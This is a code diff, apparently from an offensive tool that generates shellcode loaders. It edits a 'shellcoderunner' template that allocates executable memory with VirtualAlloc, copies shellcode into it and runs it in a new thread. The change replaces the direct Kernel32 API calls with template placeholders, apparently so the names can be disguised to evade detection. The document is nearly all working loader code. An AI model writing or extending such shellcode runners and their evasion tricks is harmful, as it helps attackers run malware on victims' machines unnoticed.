@@ -17,13 +17,13 @@ class shellcoderunner:
         return """
     {transformers}
 
-    const address = Kernel32.VirtualAlloc(0, {shellcodeSize}, MemoryAllocationType.MEM_COMMIT | MemoryAllocationType.MEM_RESERVE, MemoryProtection.PAGE_EXECUTE_READWRITE);
+    const address = {VirtualAlloc}(0, {shellcodeSize}, MemoryAllocationType.MEM_COMMIT | MemoryAllocationType.MEM_RESERVE, MemoryProtection.PAGE_EXECUTE_READWRITE);
 
     const buffer = new Uint8Array(toArrayBuffer(Number(address), 0, {shellcodeSize}));
 
     buffer.set(shellcode);
 
-    const hThread = Kernel32.CreateThread(null, 0, address, null, 0, null);
+    const hThread = {CreateThread}(null, 0, address, null, 0, null);
 
-    Kernel32.WaitForSingleObject(hThread, -1);
+    {WaitForSingleObject}(hThread, -1);
 """
